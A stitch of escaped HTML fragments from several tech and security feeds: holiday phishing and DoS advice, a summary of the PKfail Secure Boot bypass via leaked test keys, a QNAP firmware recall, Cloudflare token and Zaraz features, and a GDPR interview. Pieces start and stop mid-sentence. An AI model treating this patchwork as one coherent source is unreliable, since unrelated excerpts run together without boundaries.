&lt;p&gt;(With a DoS attack, just one computer is attacking the server.)&lt;/p&gt;



&lt;p&gt;Attackers may also launch a DoS attack to distract you from a different attack – ransomware, for example.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Phishing and social engineering&lt;/h3&gt;



&lt;p&gt;Phishing and social engineering attacks invariably rise during the holidays, targeting both consumers and employees.&lt;/p&gt;



&lt;p&gt;Common holiday scams include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Fake delivery notifications;&lt;/li&gt;



&lt;li&gt;Fake charities requesting donations;&lt;/li&gt;



&lt;li&gt;Fraudulent vacation offers and rentals;&lt;/li&gt;



&lt;li&gt;Social media scams – impersonated brands and fake giveaways; and&lt;/li&gt;



&lt;li&gt;Fake shopping sites with urgent deals and too-good-to-be-true offers.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;With more staff out of office, threat actors may also impersonate an employee, asking a ‘colleague’ to take action on their behalf.&lt;/p&gt;



&lt;p&gt;Such emails often contain a sense of urgency, or try to manipulate you in another way. Don’t forget: social engineering is all about exploiting your psychology.&lt;/p&gt;



&lt;p&gt;As our penetration tester Hilmi Tin explained in &lt;a href="https://www.itgovernance.co.uk/blog/meet-the-hacker-how-simulated-phishing-addresses-your-biggest-security-risk#What-is-simulated-phishing" rel="noreferrer noopener" target="_blank"&gt;this interview&lt;/a&gt;, attackers take advantage of the fact we’re curious, or make clever use of fear tactics.&lt;/p&gt;



&lt;p&gt;He also recommends simply taking ten seconds to look out for warning signs – particularly if the message is unexpected and making you feel like you need to do something.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;How to protect your sensitive data&lt;/h2&gt;



&lt;p&gt;To protect your sensitive data – including personal data – make sure you’re clear on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What data you hold;&lt;/li&gt;



&lt;li&gt;Where it’s stored; and&lt;/li&gt;



&lt;li&gt;Who can access that data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Tools like data inventories, &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-flow-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow maps&lt;/a&gt; and &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt; will help with this. Ideally, these also highlight the technical and/or organisational measures in place to process and secure that data, as required by the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Other tools like &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-protection-impact-assessment" rel="noreferrer noopener" target="_blank"&gt;DPIAs (data protection impact assessments)&lt;/a&gt; also provide valuable information, making it easier to understand your data, so you can better &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;manage your risks&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Up-to-date policies and procedures will also improve your cyber security and privacy stance, and ensure you’re ready to deal with any threats.&lt;/p&gt;



&lt;p&gt;Finally, &lt;a href="https://www.itgovernance.co.uk/staff-awareness-e-learning-courses" rel="noreferrer noopener" target="_blank"&gt;staff awareness training&lt;/a&gt; offers another valuable boost to your security.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Going the extra mile&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized"&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/6116.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;But to find out whether your training and other measures are effective, consider launching a (simulated) real-world attack.&lt;/p&gt;



&lt;p&gt;Our unique &lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;simulated phishing programme&lt;/strong&gt;&lt;/a&gt; combines interactive staff training, simulated phishing attacks and a session with an ethical hacker to significantly improve your resilience to phishing attacks.&lt;/p&gt;



&lt;p&gt;Following testing, employees will receive personalised feedback on their vulnerabilities, practical advice on phishing detection and a clear understanding of how to protect your organisation better.&lt;/p&gt;



&lt;p&gt;We’ve trialled this programme with various organisations, and the results have been incredible. The live training sessions dramatically reduce the risk of phishing attacks, and end users find the interaction and ability to ask questions invaluable.&lt;/p&gt;

This ensures that end users can confidently rely on the integrity of the underlying hardware, firmware, and software.&lt;/p&gt;
&lt;p&gt;One of the most prevalent mechanisms for enforcing trust in the UEFI firmware ecosystem is Secure Boot, which ensures that only digitally signed and verified software is executed during the system boot process, safeguarding against attacks on “external” firmware components and boot loaders. A key component of Secure Boot is the Platform Key (PK), the root-of-trust key used for managing the cryptographic material that validates external components and bootloaders before execution.&lt;/p&gt;
&lt;p&gt;Given its critical role, one would expect all best practices for cryptographic key management to be meticulously followed, but that has not always been the case. &lt;/p&gt;
&lt;p&gt;In this talk, Binarly’s Alex Matrosov and Fabio Pagani unveil PKfail, a firmware supply-chain security issue affecting major device vendors and hundreds of device models. PKfail is the result of shipping default test keys included by IBVs in their reference implementation—a problem known since 2016 but clearly forgotten by the firmware industry.&lt;/p&gt;
&lt;p&gt;Given these test keys leaked during various data breaches in the past few years, an attacker can leverage PKfail to completely bypass Secure Boot on affected devices. As Alex and Fabio  demonstrate in the presentation, PKfail makes it extremely straightforward to bootkit affected devices and to launch advanced firmware-level threats, such as BlackLotus.&lt;/p&gt;
&lt;p&gt;The speakers also offer a retrospective industry-wide analysis on PKfail, based on their extensive dataset of UEFI firmware images, spanning hundreds of product lines marketed over the past decade.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

The company has pulled back the firmware and issued a fixed version, but the company's response has left some users feeling less confident in the boxes into which they put all their digital stuff.&lt;/p&gt;
&lt;p&gt;As seen on &lt;a href="https://community.qnap.com/t/firmware-qts-5-2-2-2950-build-20241114-released/254"&gt;a QNAP community thread&lt;/a&gt;, and as &lt;a href="https://www.qnap.com/en-us/news/2024/qnap-addresses-recent-qts-5-2-2-operating-system-update-issues"&gt;announced by QNAP itself&lt;/a&gt;, the QNAP operating system, QTS, received update 5.2.2.2950, build 20241114, at some point around November 19. After QNAP "received feedbacks from some users reporting issues with device functionality after installation," the firm says it withdrew it, "conducted a comprehensive investigation," and re-released a fixed version "within 24 hours."&lt;/p&gt;
&lt;p&gt;The community thread sees many more users of different systems having problems than the shortlist ("limited models of TS-x53D series and TS-x51 series") released by QNAP. Issues reported included owners being rejected as an authorized user, devices reporting issues with booting, and claims of Python not being installed to run some apps and services.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/11/qnap-firmware-update-leaves-nas-owners-locked-out-of-their-boxes/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Additionally, Zaraz Automation Actions streamlines event tracking and third-party tool integration.</description><content:encoded>&lt;p&gt;In October 2024, we started publishing roundup blog posts to share the latest features and updates from our teams. Today, we are announcing general availability for Account Owned Tokens, which allow organizations to improve access control for their Cloudflare services. Additionally, we are launching Zaraz Automated Actions, which is a new feature designed to streamline event tracking and tool integration when setting up third-party tools. By automating common actions like pageviews, custom events, and e-commerce tracking, it removes the need for manual configurations.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Improving access control for Cloudflare services with Account Owned Tokens&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#improving-access-control-for-cloudflare-services-with-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare is critical infrastructure for the Internet, and we understand that many of the organizations that build on Cloudflare rely on apps and integrations outside the platform to make their lives easier. In order to allow access to Cloudflare resources, these apps and integrations interact with Cloudflare via our API, enabled by access tokens and API keys. Today, the API Access Tokens and API keys on the Cloudflare platform are owned by individual users, which can lead to some difficulty representing services, and adds an additional dependency on managing users alongside token permissions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s new about Account Owned Tokens&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-new-about-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;First, a little explanation because the terms can be a little confusing. On Cloudflare, we have both Users and Accounts, and they mean different things, but sometimes look similar. Users are people, and they sign in with an email address. Accounts are not people, they’re the top-level bucket we use to organize all the resources you use on Cloudflare. Accounts can have many users, and that’s how we enable collaboration. If you use Cloudflare for your personal projects, both your User and Account might have your email address as the name, but if you use Cloudflare as a company, the difference is more apparent because your user is “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;” and the account might be “Example Company”. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5tcNkxDjYz9jAXnfV0bPON/920a9dade7145de2adee21afa43d786e/image13.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;Account Owned Tokens are not confined by the permissions of the creating user (e.g. a user can never make a token that can edit a field that they otherwise couldn’t edit themselves) and are scoped to the account they are owned by. This means that instead of creating a token belonging to the user “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;”, you can now create a token belonging to the account “Example Company”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/ibh4sT2wgVLVTgqgv2rtO/eb972a5b1c5fa0f70471631430a8ff91/image8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;The ability to make these tokens, owned by the account instead of the user, allows for more flexibility to represent what the access should be used for.&lt;/p&gt;&lt;p&gt;Prior to Account Owned Tokens, customers would have to have a user (&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;) create a token to pull a list of Cloudflare zones for their account and ensure their security settings are set correctly as part of a compliance workflow, for example. All of the actions this compliance workflow does are now attributed to joe.smith, and if joe.smith leaves the company and his permissions are revoked, the compliance workflow fails.&lt;/p&gt;&lt;p&gt;With this new release, an Account Owned Token could be created, named “compliance workflow”, with permissions to do this operation independently of &lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;. All actions this token does are attributable to “compliance workflow”. This token is visible and manageable by all the superadmins on your Cloudflare account. If joe.smith leaves the company, the access remains independent of that user, and all super administrators on the account moving forward can still see, edit, roll, and delete the token as needed.&lt;/p&gt;&lt;p&gt;Any long-running services or programs can be represented by these types of tokens, be made visible (and manageable) by all super administrators in your Cloudflare account, and truly represent the service, instead of the users managing the service. Audit logs moving forward will log that a given token was used, and user access can be kept to a minimum.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Getting started&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#getting-started"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Account Owned Tokens can be found on the new “API Tokens” tab under the “Manage Account” section of your Cloudflare dashboard, and any Super Administrators on your account have the capability to create, edit, roll, and delete these tokens. The API is the same, but at a new &lt;code&gt;/account/&amp;lt;accountId&amp;gt;/tokens&lt;/code&gt; endpoint.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/uZFVUp1RRP1NgZli9RAYN/5e2b90bea51b7b45bb25478120fd9024/Screenshot_2024-11-13_at_20.14.43.png" /&gt;
          &lt;/figure&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1kiUi4lsJESJqr9HhgCS92/b4b0a3e955742346a5c945601fff4885/image3.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use Account Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few places we would recommend replacing your User Owned Tokens with Account Owned Tokens:&lt;/p&gt;&lt;p&gt;1. &lt;b&gt;Long-running services that are managed by multiple people:&lt;/b&gt; When multiple users all need to manage the same service, Account Owned Tokens can remove the bottleneck of requiring a single person to be responsible for all the edits, rotations, and deletions of the tokens. In addition, this guards against any user lifecycle events affecting the service. If the employee that owns the token for your service leaves the company, the service’s token will no longer be based on their permissions.&lt;/p&gt;&lt;p&gt;2.&lt;b&gt; Cloudflare accounts running any services that need attestable access records beyond user membership:&lt;/b&gt; By restricting all of your users from being able to access the API, and consolidating all usable tokens to a single list at the account level, you can ensure that a complete list of all API access can be found in a single place on the dashboard, under “Account API Tokens”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2qtssh6bef5Ne6kugqUUnc/af11e3db733f4f38188988ac42034c26/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;3. &lt;b&gt;Anywhere you’ve created “Service Users”:&lt;/b&gt; “Service Users”, or any identity that is meant to allow multiple people to access Cloudflare, are an active threat surface. They are generally highly privileged, and require additional controls (vaulting, password rotation, monitoring) to ensure non-repudiation and appropriate use. If these operations solely require API access, consolidating that access into an Account Owned Token is safe.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use User Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-user-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few scenarios/situations where you should continue to use User Owned Tokens:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where programmatic access is done by a single person at an external interface:&lt;/b&gt; If a single user has an external interface using their own access privileges at Cloudflare, it still makes sense to use a personal token, so that information access can be traced back to them. (e.g. using a personal token in a data visualization tool that pulls logs from Cloudflare)&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/api/operations/user-user-details"&gt;&lt;b&gt;&lt;u&gt;User level operations&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;:&lt;/b&gt; Any operations that operate on your own user (e.g. email changes, password changes, user preferences) still require a user level token.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you want to control resources over multiple accounts with the same credential:&lt;/b&gt; As of November 2024, Account Owned Tokens are scoped to a single account. In 2025, we want to ensure that we can create cross-account credentials, anywhere that multiple accounts have to be called in the same set of operations should still rely on API Tokens owned by a user.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where we currently do not support a given endpoint:&lt;/b&gt; We are currently in the process of working through a &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;list of our services&lt;/u&gt;&lt;/a&gt; to ensure that they all support Account Owned Tokens. When interacting with any of these services that are not supported programmatically, please continue to use User Owned Tokens.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you need to do token management programmatically:&lt;/b&gt; If you are in an organization that needs to create and delete large numbers of tokens programmatically, please continue to use User Owned Tokens. In late 2024, watch for the “Create Additional Tokens” template on the Account Owned Tokens Page. This template and associated created token will allow for the management of additional tokens.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4BGL99WFnh4oOgTFhRY5N3/26bca9fa8851729d4128c2836db62c3c/image6.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What does this mean for my existing tokens and programmatic access moving forward?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-does-this-mean-for-my-existing-tokens-and-programmatic-access-moving-forward"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We do not plan to decommission User Owned Tokens, as they still have a place in our overall access model and are handy for ensuring user-centric workflows can be implemented.&lt;/p&gt;&lt;p&gt;As of November 2024, we’re still working to ensure that ALL of our endpoints work with Account Owned Tokens, and we expect to deliver additional token management improvements continuously, with an expected end date of Q3 2025 to cover all endpoints.&lt;/p&gt;&lt;p&gt;A list of services that support, and do not support, Account Owned Tokens can be found in our &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;documentation.&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;

            &lt;a href="https://blog.cloudflare.com/tag/security/rss#zaraz-automated-actions-makes-adding-tools-to-your-website-a-breeze"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5DkxlchIDUZbQ15x0H0usK/eb656617c1c83805bda98c7dfe896bda/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/en-gb/application-services/products/zaraz/"&gt;&lt;u&gt;Cloudflare Zaraz&lt;/u&gt;&lt;/a&gt; is a tool designed to manage and optimize third-party tools like analytics, marketing tags, or social media scripts on websites. By loading these third-party services through Cloudflare’s network, Zaraz improves website performance, security, and privacy. It ensures that these external scripts don't slow down page loading times or expose sensitive user data, as it handles them efficiently through Cloudflare's global network, reducing latency and improving the user experience.&lt;/p&gt;&lt;p&gt;Automated Actions are a new product feature that allow users to easily setup page views, custom events, and e-commerce tracking without going through the tedious process of manually setting up triggers and actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why we built Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-we-built-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;An action in Zaraz is a way to tell a third party tool that a user interaction or event has occurred when certain conditions, defined by &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;triggers&lt;/u&gt;&lt;/a&gt;, are met. You create actions from within the tools page, associating them with specific tools and triggers.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6a0xBA0uG55z4mhVkN0aYl/10101523491c68e4f2eec022737d15d4/image12.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Setting up a tool in Zaraz has always involved a few steps: &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;configuring a trigger&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-action/"&gt;&lt;u&gt;linking it to a tool action&lt;/u&gt;&lt;/a&gt; and finally calling &lt;a href="https://developers.cloudflare.com/zaraz/web-api/track/"&gt;&lt;code&gt;&lt;u&gt;zaraz.track()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;. This process allowed advanced configurations with complex rules, and while it was powerful, it occasionally left users confused — why isn’t calling &lt;code&gt;zaraz.track()&lt;/code&gt; enough? We heard your feedback, and we’re excited to introduce &lt;b&gt;Zaraz Automated Actions&lt;/b&gt;, a feature designed to make Zaraz easier to use by reducing the amount of work needed to configure a tool.&lt;/p&gt;&lt;p&gt;With Zaraz Automated Actions, you can now automate sending data to your third-party tools without the need to create a manual configuration. Inspired by the simplicity of &lt;a href="https://developers.cloudflare.com/zaraz/web-api/ecommerce/"&gt;&lt;code&gt;&lt;u&gt;zaraz.ecommerce()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, we’ve extended this ease to all Zaraz events, removing the need for manual trigger and action setup. For example, calling &lt;code&gt;zaraz.track(‘myEvent’)&lt;/code&gt; will send your event to the tool without the need to configure any triggers or actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Getting started with Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#getting-started-with-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When adding a new tool in Zaraz, you’ll now see an additional step where you can choose one of three Automated Actions: &lt;b&gt;pageviews&lt;/b&gt;, &lt;b&gt;all other events&lt;/b&gt;, or &lt;b&gt;ecommerce&lt;/b&gt;. These options allow you to specify what kind of events you want to automate for that tool.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1LRtb8XpSukCAgmK7uIA5Y/ab11ae9b58f474d08893b496a0eea764/image7.png" /&gt;
          &lt;/figure&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Pageviews&lt;/b&gt;: Automatically sends data to the tool whenever someone visits a page on your site, without any manual configuration.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;All other events&lt;/b&gt;: Sends all custom events triggered using zaraz.track() to the selected tool, making it easy to automate tracking of user interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Ecommerce&lt;/b&gt;: Automatically sends all e-commerce events triggered via zaraz.ecommerce() to the tool, streamlining your sales and transaction tracking.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These Automated Actions are also available for all your existing tools, which can be toggled on or off from the tool detail page in your Zaraz dashboard. This flexibility allows you to fine-tune which actions are automated based on your needs.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/xy1tIfYTfOo7p2IUeCS5d/42b26d6cfc4c05d8adc67edfc38ac34c/image10.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Custom actions for tools without Automated Action support&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#custom-actions-for-tools-without-automated-action-support"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Some tools do not support automated actions because the tool itself does not support page view, custom, or e-commerce events. For such tools you can still create your own custom actions, just like before. Custom actions allow you to configure specific events to send data to your tools based on unique triggers. The process remains the same, and you can follow the detailed steps outlined in our&lt;a href="https://developers.cloudflare.com/zaraz/get-started/create-actions/"&gt; &lt;u&gt;Create Actions guide&lt;/u&gt;&lt;/a&gt;. Remember to set up your trigger first, or choose an existing one, before configuring the action.&lt;/p&gt;&lt;h4&gt;Automatically enrich your payload&lt;/h4&gt;&lt;p&gt;When creating a custom action, it is now easier to send Event Properties using the &lt;b&gt;Include Event Properties field.&lt;/b&gt; When this is toggled on, you can automatically send client-specific data with each action, such as user behavior or interaction details. For example, to send an &lt;code&gt;userID&lt;/code&gt; property when sending a &lt;code&gt;click&lt;/code&gt; event you can do something like this: &lt;code&gt;zaraz.track(‘click’, { userID: “foo” })&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Additionally, you can enable the &lt;b&gt;Include System Properties&lt;/b&gt; option to send system-level information, such as browser, operating system, and more. In your action settings click on “Add Field”, pick the “Include System Properties”, click on confirm and then toggle the field on. &lt;/p&gt;&lt;p&gt;For a full list of system properties, visit our&lt;a href="https://developers.cloudflare.com/zaraz/reference/context/"&gt; &lt;u&gt;System Properties reference guide&lt;/u&gt;&lt;/a&gt;. These options give you greater flexibility and control over the data you send with custom actions.&lt;/p&gt;&lt;p&gt;These two fields replace the now deprecated “Enrich Payload” dropdown field.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/73nCsNmeG58p6n0ylxMV8E/5cb87b516aaceb38319f9175dc7ccbf3/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Zaraz Automated Actions marks a significant step forward in simplifying how you manage events across your tools. By automating common actions like page views, e-commerce events, and custom tracking, you can save time and reduce the complexity of manual configurations. Whether you’re leveraging Automated Actions for speed or creating custom actions for more tailored use cases, Zaraz offers the flexibility to fit your workflow. &lt;/p&gt;&lt;p&gt;We’re excited to see how you use this feature.

When I asked data privacy trainer and DPO (data protection officer) Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too. Andy took the first principle as an example, saying: You’d think organisations can get something as basic &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr"&gt;How Organisations Are Failing to Process Personal Data Lawfully Under the GDPR&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Problems with consent, purpose limitation, retention periods, and more&lt;/h2&gt;



&lt;p&gt;&lt;em&gt;At the heart of the &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;GDPR (General Data Protection Regulation)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; lie the Article 5 data protection principles.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;When I asked &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/gdpr-training" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;data privacy trainer&lt;/em&gt;&lt;/a&gt;&lt;em&gt; and &lt;/em&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;em&gt;DPO (data protection officer)&lt;/em&gt;&lt;/a&gt;&lt;em&gt; Andy Snow which principle organisations are most prone to getting wrong, he found it hard to pick just one. In part, this is due to how the principles naturally interlink – an issue with one principle naturally leads to issues with (some of) the others, too.&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Andy took the first principle as an example, saying:&lt;/em&gt;&lt;/p&gt;



&lt;blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;You’d think organisations can get something as basic as ‘lawfulness, fairness and transparency’ right, but no!&lt;/p&gt;



&lt;p&gt;There are often problems with the lawfulness of personal data processing, largely due to over-reliance on consent. Organisations still don’t understand what consent &lt;em&gt;actually&lt;/em&gt; entails.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;p&gt;&lt;em&gt;I sat down with Andy to find out more. How are organisations failing to process personal data lawfully under the GDPR, and how can they address this while improving their day-to-day business operations?&lt;/em&gt;&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this interview&lt;/h2&gt;

&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Lawful-bases"&gt;Lawful bases&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Consent"&gt;Consent&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Lawful-processing:-not-breaking-other-laws"&gt;Lawful processing: not breaking other laws&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;You say organisations misunderstand consent under the GDPR. Could you elaborate?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Suppose you have an organisation processing a million people’s data for &lt;a href="https://www.itgovernance.co.uk/green-papers/gdpr-and-pecr-a-guide-for-marketers" rel="noreferrer noopener" target="_blank"&gt;marketing&lt;/a&gt; purposes based on consent. &lt;a href="https://www.itgovernance.co.uk/blog/how-you-can-demonstrate-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;Accountability&lt;/a&gt; says you must be able to &lt;em&gt;demonstrate&lt;/em&gt; that consent – but organisations frequently can’t.&lt;/p&gt;



&lt;p&gt;And then we face the next problem. Out of that million people, when was the last time someone purchased something? Or even &lt;em&gt;engaged&lt;/em&gt; with the marketing: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Within the last month?&lt;/li&gt;



&lt;li&gt;Within the last three months?&lt;/li&gt;



&lt;li&gt;Within the last six months?&lt;/li&gt;



&lt;li&gt;Within the last year?&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Few organisations can give me that breakdown.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Business-benefits-of-GDPR-compliance"&gt;Business benefits of GDPR compliance&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Putting consent aside for a moment [we come back to it &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Consent"&gt;later&lt;/a&gt;], collecting that much data you’re not using seems counterproductive from a business point of view too.&lt;/strong&gt;&lt;/p&gt;



